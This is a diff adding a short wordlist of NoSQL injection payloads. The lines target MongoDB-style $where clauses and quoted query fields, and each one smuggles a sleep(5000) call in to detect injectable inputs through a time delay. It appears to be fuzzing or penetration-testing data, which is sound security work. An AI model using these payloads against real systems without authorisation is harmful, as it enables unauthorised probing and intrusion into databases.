@@ -1,0 +1,12 @@
+' && sleep(5000) && '1'=='1
+' || sleep(5000) || '1'=='1
+' && this.sleep(5000) && '1'=='1
+';sleep(5000);'
+1' && sleep(5000) && '1
+1' || sleep(5000) || '1
+{$where: "sleep(5000)"}
+{$where: "this.sleep(5000)"}
+{$where: "1;sleep(5000)"}
+;sleep(5000);
+' && function(){ sleep(5000) }() && '1'=='1
+' || function(){ sleep(5000) }() || '1'=='1
